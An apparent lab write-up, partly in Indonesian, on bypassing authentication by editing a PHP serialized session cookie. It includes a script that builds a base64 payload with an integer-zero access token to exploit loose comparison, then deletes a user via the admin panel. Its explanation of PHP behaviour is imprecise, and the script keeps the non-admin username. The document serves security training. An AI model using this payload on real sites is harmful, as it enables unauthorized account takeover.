# Lab: Modifying serialized data types

Challenge Description
 This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 

Goal
modify serialized objects berupa session user, privilege escalation menjadi admin via perilaku php pada versi 7 kebawah dalam cara kerja dari variabel dan hapus user carlos di admin panel

Solver
login dengan credential yang diberikan
disini langsung saja saya menggunakan script
```php
<?php
class User {
    public $username = "wiener";
    public $access_token = 0;
}

$payload = base64_encode(serialize(new User()));
echo $payload;
// Output: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==
?>
```
jadi dalam php versi 7 kebawah setiap variabel di set sebagai int dengan value 0 dan dan malah diannggap sebagai true
jadi bisa mendapatkan privilege escalation cuma dari perilaku php ini

sisanya tinggal masuk ke panel admin dan hapus user carlos
